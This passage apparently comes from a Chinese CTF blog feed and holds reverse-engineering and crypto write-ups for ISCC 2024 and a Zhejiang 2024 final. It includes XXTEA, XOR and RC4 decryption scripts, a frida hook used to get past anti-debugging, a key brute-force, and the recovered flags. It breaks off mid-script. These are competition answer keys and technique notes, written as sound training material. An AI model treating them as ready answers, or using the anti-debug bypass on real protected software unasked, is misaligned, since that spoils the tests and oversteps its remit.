class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 0x9E3779B9</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MX (z &gt;&gt; 5 ^ y <span class="hljs-string">&lt;&lt; 2) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 4) ^ (sum ^ y) + (k[(p &amp; 3) ^ e] ^ z)</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">xxtea_encrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *v, <span class="hljs-type">uint32_t</span> len, <span class="hljs-type">uint32_t</span> *k)</span> &#123;<br>    <span class="hljs-type">uint32_t</span> n = len - <span class="hljs-number">1</span>;<br>    <span class="hljs-type">uint32_t</span> y, z, sum = <span class="hljs-number">0</span>, e, p, q;<br>    q = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / len;<br>    <span class="hljs-keyword">while</span> (q-- &gt; <span class="hljs-number">0</span>) &#123;<br>        sum += DELTA;<br>        e = sum &gt;&gt; <span class="hljs-number">2</span> &amp; <span class="hljs-number">3</span>;<br>        <span class="hljs-keyword">for</span> (p = <span class="hljs-number">0</span>; p &lt; n; p++) &#123;<br>            y = v[p + <span class="hljs-number">1</span>];<br>            z = v[p] += MX;<br>        &#125;<br>        y = v[<span class="hljs-number">0</span>];<br>        z = v[n] += MX;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">xxtea_decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *v, <span class="hljs-type">uint32_t</span> len, <span class="hljs-type">uint32_t</span> *k)</span> &#123;<br>    <span class="hljs-type">uint32_t</span> n = len - <span class="hljs-number">1</span>;<br>    <span class="hljs-type">uint32_t</span> y, z, sum, e, p, q;<br>    q = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / len;<br>    sum = q * DELTA;<br>    y = v[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">while</span> (sum != <span class="hljs-number">0</span>) &#123;<br>        e = sum &gt;&gt; <span class="hljs-number">2</span> &amp; <span class="hljs-number">3</span>;<br>        <span class="hljs-keyword">for</span> (p = n; p &gt; <span class="hljs-number">0</span>; p--) &#123;<br>            z = v[p - <span class="hljs-number">1</span>];<br>            y = v[p] -= MX;<br>        &#125;<br>        z = v[n];<br>        y = v[<span class="hljs-number">0</span>] -= MX;<br>        sum -= DELTA;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">8</span>] = &#123; <br>      <span class="hljs-number">3962803346</span>,<span class="hljs-number">3145558623</span>,<span class="hljs-number">1541010058</span>,<span class="hljs-number">1093420299</span>,<br>      <span class="hljs-number">3315082129</span>,<span class="hljs-number">861271549</span>,<span class="hljs-number">352576336</span>,<span class="hljs-number">60051825</span>, &#125;;<br>      <span class="hljs-type">uint32_t</span> key[<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> &#125;;<br>      <span class="hljs-type">uint32_t</span> i;<br>      <span class="hljs-type">uint32_t</span> temp[<span class="hljs-number">2</span>];<br>      <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i += <span class="hljs-number">2</span>)&#123;<br>        temp[<span class="hljs-number">0</span>] = v[i]; <br>        temp[<span class="hljs-number">1</span>] = v[i + <span class="hljs-number">1</span>]; <br>        xxtea_decrypt(temp, <span class="hljs-number">2</span>, key);<br>        v[i] = temp[<span class="hljs-number">0</span>];<br>        v[i + <span class="hljs-number">1</span>] = temp[<span class="hljs-number">1</span>];<br>      &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, (<span class="hljs-type">char</span> *)v);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//flag&#123;GDu7Il0v3uP1zl3tm3Gr@duate&#125;?</span><br></code></pre></td></tr></table></figure><h1 id="main函数前"><a href="#main函数前" class="headerlink" title="main函数前"></a>main函数前</h1><p>当前面几种方法失效的时候可以main函数往上找一找</p><h2 id="2024ISCCRe-Find-All"><a href="#2024ISCCRe-Find-All" class="headerlink" title="2024ISCCRe-Find_All"></a>2024ISCCRe-Find_All</h2><p>这题就是在main函数前面有可疑数据</p><img src="/2024/11/14/%E6%95%B0%E6%8D%AE%E4%BF%AE%E6%94%B9%E6%80%BB%E7%BB%93/1715168249079-52d70d9e-0399-4ce9-8b06-6743231f3bcc-174427169239118.png" class="" title="img"><p>交叉引用找到父函数，找到可能的加密逻辑，4个一循环然后相邻位置异或</p><img src="/2024/11/14/%E6%95%B0%E6%8D%AE%E4%BF%AE%E6%94%B9%E6%80%BB%E7%BB%93/1715168293859-8aff9d2d-102a-41d5-98ce-3d1c14660c06-174427169239120.png" class="" title="img"><p>去试试看，发现是对的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">26</span>,<span class="hljs-number">16</span>,<span class="hljs-number">0</span>,<span class="hljs-number">67</span>,<span class="hljs-number">8</span>,<span class="hljs-number">32</span>,<span class="hljs-number">18</span>,<span class="hljs-number">65</span>,<span class="hljs-number">113</span>,<span class="hljs-number">1</span>,<span class="hljs-number">119</span>,<span class="hljs-number">68</span>,<span class="hljs-number">35</span>,<span class="hljs-number">1</span>,<span class="hljs-number">34</span>,<span class="hljs-number">99</span>,<span class="hljs-number">35</span>,<span class="hljs-number">7</span>,<span class="hljs-number">18</span>,<span class="hljs-number">118</span>,<span class="hljs-number">39</span>,<span class="hljs-number">97</span>,<span class="hljs-number">92</span>,<span class="hljs-number">125</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(a))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">24</span>,<span class="hljs-number">4</span>):<br>    a[i + <span class="hljs-number">2</span>] = a[i + <span class="hljs-number">2</span>] ^ a[i + <span class="hljs-number">3</span>]<br>    a[i + <span class="hljs-number">1</span>] = a[i + <span class="hljs-number">1</span>] ^ a[i + <span class="hljs-number">2</span>]<br>    a[i]=a[i]^a[i+<span class="hljs-number">1</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">24</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(a[i]),end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-comment">#ISCC&#123;sSAC23Dc@Ac@cdvg@!&#125;</span><br></code></pre></td></tr></table></figure><p><a href="数据修改总结/download/数据修改总结附件.zip" download>数据修改总结附件.zip</a></p>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>浙江省省赛2024决赛wp</title>
    <link href="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/"/>
    <url>/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/</url>
    
    <content type="html"><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="Re2"><a href="#Re2" class="headerlink" title="Re2"></a><strong>Re2</strong></h2><p>upx魔改</p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731225551114-2b85de62-0f34-46b9-87a4-add343090308.png" class="" title="img"><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731225556112-d7f85dae-67cc-4f9b-bd01-79007883786f.png" class="" title="img"><p>然后直接base64变表</p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731225562160-a66130c9-b178-41dd-961a-e9ffc15b5d57.png" class="" title="img"><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731225568502-6ba1b995-eb09-4926-9e77-50ebd10518cc.png" class="" title="img"><h2 id="Re1"><a href="#Re1" class="headerlink" title="Re1"></a>Re1</h2><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731225621390-a77158f0-69d7-409c-98d1-5f7aefc3053f.png" class="" title="img"><p>Rc4得到真正的key</p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731225590433-7d6cb192-805b-4d90-9ce4-bbfffab4926f.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">data, key</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        out.append(char ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>])<br><br>    <span class="hljs-keyword">return</span> out<br><br><br>data = <span class="hljs-string">b&#x27;ban_debug!&#x27;</span><br>key = <span class="hljs-string">b&#x27;keykey&#x27;</span><br>decrypted = rc4(data, key)<br><span class="hljs-built_in">print</span>(decrypted)<br><br><span class="hljs-comment">#[105, 13, 90, 178, 64, 234, 25, 63, 47, 106]</span><br></code></pre></td></tr></table></figure><p>crypto2魔改rc4</p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731225608981-03f4cabb-0132-48a1-8329-c349e944c9c8.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">data, key</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        char+=S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>        char%=<span class="hljs-number">256</span><br>        out.append(char)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(out)<br><br><br>data = <span class="hljs-built_in">bytes</span>([  <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x66</span>,<br>  <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x08</span>,<br>  <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x81</span>,<br>  <span class="hljs-number">0xCF</span>])<br>key = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">105</span>, <span class="hljs-number">13</span>, <span class="hljs-number">90</span>, <span class="hljs-number">178</span>, <span class="hljs-number">64</span>, <span class="hljs-number">234</span>, <span class="hljs-number">25</span>, <span class="hljs-number">63</span>, <span class="hljs-number">47</span>, <span class="hljs-number">106</span>])<br>decrypted = rc4(data, key)<br><span class="hljs-built_in">print</span>(decrypted)<br><br><span class="hljs-comment">#b&#x27;flag&#123;1237-12938-9372-1923-4u92&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="Re3-3"><a href="#Re3-3" class="headerlink" title="Re3-3"></a>Re3-3</h2><p>题目提示debug，一开始tls得到1.exe</p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731295791640-b6d8752f-34d8-41b2-a404-86b39047ce09.png" class="" title="img"><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731291068523-66bc3109-d689-4a2d-81c8-decd297d4f02.png" class="" title="img"><p>v4像key，后面是分组加密</p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731296051739-f625ee35-fd7c-4f31-802d-85e79259a039.png" class="" title="img"><p>一眼aes</p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731295906706-3d04359a-ef97-495e-82c4-c3e0d161665d.png" class="" title="img"><p>看上去像s盒</p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731295935831-c124af9b-d1b8-4d8d-8c3c-6aad111e01e9.png" class="" title="img"><p>但是怎么解密都不对，回去看re3.exe</p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731291025127-7611a8ca-f8c2-4646-a8af-fcbaf4bafee4.png" class="" title="img"><p>得到标准aes的s盒</p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731290990015-66007b87-f2ef-4923-9239-dcf16b080ed3.png" class="" title="img"><p>还是不对，看师傅用frida尝试去hook，因为不会被反调试检测</p><p>frida -l .\hook.js -n 1.exe</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Mycode"><a href="#Mycode" class="headerlink" title="Mycode"></a>Mycode</h2><p>加解密脚本都写好了，直接fromhex然后爆破即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">substitute</span>(<span class="hljs-params">state, sub_box</span>):<br>    <span class="hljs-keyword">return</span> [sub_box[b &amp; <span class="hljs-number">0xF</span>] | (sub_box[(b &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xF</span>] &lt;&lt; <span class="hljs-number">4</span>) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> state]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_round_keys</span>(<span class="hljs-params">base_key, rounds</span>):<br>    round_keys = []<br>    temp_key = base_key<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(rounds):<br>        round_keys.append(temp_key &amp; <span class="hljs-number">0xFFFFFFFF</span>)<br>        temp_key ^= ((temp_key &lt;&lt; <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span>) | ((temp_key &gt;&gt; <span class="hljs-number">31</span>) &amp; <span class="hljs-number">0x1</span>)<br>    <span class="hljs-keyword">return</span> round_keys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_state</span>(<span class="hljs-params">base_key, state, rounds, encrypt</span>):<br>    sub_box = [<span class="hljs-number">0x9</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0xA</span>, <span class="hljs-number">0xB</span>, <span class="hljs-number">0xD</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x8</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0x6</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x3</span>, <span class="hljs-number">0xC</span>, <span class="hljs-number">0xE</span>, <span class="hljs-number">0xF</span>, <span class="hljs-number">0x7</span>]<br>    inv_sub_box = [<span class="hljs-number">0xA</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xB</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0x8</span>, <span class="hljs-number">0xF</span>, <span class="hljs-number">0x6</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x3</span>, <span class="hljs-number">0xC</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0xD</span>, <span class="hljs-number">0xE</span>]<br><br>    round_keys = generate_round_keys(base_key, rounds)<br><br>    <span class="hljs-keyword">if</span> encrypt:<br>        <span class="hljs-keyword">for</span> <span class="hljs-built_in">round</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(rounds):<br>            state = substitute(state, sub_box)<br>            state = [s ^ ((round_keys[<span class="hljs-built_in">round</span>] &gt;&gt; (i * <span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xFF</span>) <span class="hljs-keyword">for</span> i, s <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(state)]<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> <span class="hljs-built_in">round</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(rounds - <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>            state = [s ^ ((round_keys[<span class="hljs-built_in">round</span>] &gt;&gt; (i * <span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xFF</span>) <span class="hljs-keyword">for</span> i, s <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(state)]<br>            state = substitute(state, inv_sub_box)<br><br>    <span class="hljs-keyword">return</span> state<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">plaintext, key, rounds=<span class="hljs-number">10</span></span>):<br>    length = <span class="hljs-built_in">len</span>(plaintext)<br>    padded_length = length <span class="hljs-keyword">if</span> length % <span class="hljs-number">4</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> length + (<span class="hljs-number">4</span> - (length % <span class="hljs-number">4</span>))<br>    plaintext += <span class="hljs-string">b&#x27;\x00&#x27;</span> * (padded_length - length)<br><br>    ciphertext = <span class="hljs-built_in">bytearray</span>(padded_length)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, padded_length, <span class="hljs-number">4</span>):<br>        state = <span class="hljs-built_in">list</span>(plaintext[i:i+<span class="hljs-number">4</span>])<br>        state = process_state(key, state, rounds, <span class="hljs-literal">True</span>)<br>        ciphertext[i:i+<span class="hljs-number">4</span>] = state<br><br>    <span class="hljs-keyword">return</span> ciphertext<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">ciphertext, key, rounds=<span class="hljs-number">10</span></span>):<br>    length = <span class="hljs-built_in">len</span>(ciphertext)<br>    plaintext = <span class="hljs-built_in">bytearray</span>(length)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, length, <span class="hljs-number">4</span>):<br>        state = <span class="hljs-built_in">list</span>(ciphertext[i:i+<span class="hljs-number">4</span>])<br>        state = process_state(key, state, rounds, <span class="hljs-literal">False</span>)<br>        plaintext[i:i+<span class="hljs-number">4</span>] = state<br><br>    <span class="hljs-keyword">return</span> plaintext.rstrip(<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br><span class="hljs-comment"># def main():</span><br><span class="hljs-comment">#     plaintext = b&quot;DASCTF&#123;******&#125;&quot;</span><br><span class="hljs-comment">#     key = 0xECB... # 4 bytes</span><br><span class="hljs-comment">#     ciphertext = encrypt(plaintext, key)</span><br><span class="hljs-comment">#     print(&quot;Ciphertext:&quot;, &#x27;&#x27;.join(f&quot;&#123;b:02X&#125;&quot; for b in ciphertext))</span><br><br><br>Ciphertext=<span class="hljs-string">&#x27;A6B343D2C6BE1B268C3EA4744E3AA9914E29A0789F299022820299248C23D678442A902B4C24A8784A3EA401&#x27;</span><br>Ciphertext=<span class="hljs-built_in">bytes</span>.fromhex(Ciphertext)<br><span class="hljs-built_in">print</span>(Ciphertext)<br><span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0xECB00000</span>,<span class="hljs-number">0xECBFFFFF</span>):<br>    out=decrypt(Ciphertext,key)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;DASCTF&#x27;</span> <span class="hljs-keyword">in</span> out:<br>        <span class="hljs-built_in">print</span>(key)<br>        <span class="hljs-built_in">print</span>(out)<br><br><span class="hljs-comment">#DASCTF&#123;6ef4d8e1-845a-4e3c-a4e1-a15e5530a0f4&#125;</span><br></code></pre></td></tr></table></figure><h2 id="DlcgH-1"><a href="#DlcgH-1" class="headerlink" title="DlcgH-1"></a>DlcgH-1</h2><p>看到题目的时候确实慌了，k和t都是512位，爆破不现实，又想到DH算法本身并不会，所以也没做过多尝试就返回去看re了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">b&#x27;DASCTF&#123;******&#125;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">iterate_function</span>(<span class="hljs-params">seed, coeff_a, coeff_b, prime_modulus</span>):<br>    <span class="hljs-keyword">return</span> (coeff_a * seed + coeff_b) % prime_modulus<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">iterate_multiple_times</span>(<span class="hljs-params">seed, num_iterations, coeff_a, coeff_b, prime_modulus</span>):<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_iterations):<br>        seed = iterate_function(seed, coeff_a, coeff_b, prime_modulus)<br>    <span class="hljs-keyword">return</span> seed<br><br>p = getPrime(<span class="hljs-number">600</span>)<br>a = getPrime(<span class="hljs-number">512</span>)<br>b = getPrime(<span class="hljs-number">512</span>)<br>s = getPrime(<span class="hljs-number">512</span>)<br>k = getPrime(<span class="hljs-number">512</span>)<br>t = getPrime(<span class="hljs-number">512</span>)<br><br>A = iterate_multiple_times(s, k, a, b, p)<br>B = iterate_multiple_times(s, t, a, b, p)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p =&quot;</span>, p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a =&quot;</span>, a)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;b =&quot;</span>, b)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;s =&quot;</span>, s)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;A =&quot;</span>, A)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;B =&quot;</span>, B)<br><br>secret1 = iterate_multiple_times(A, k, a, b, p)<br>secret2 = 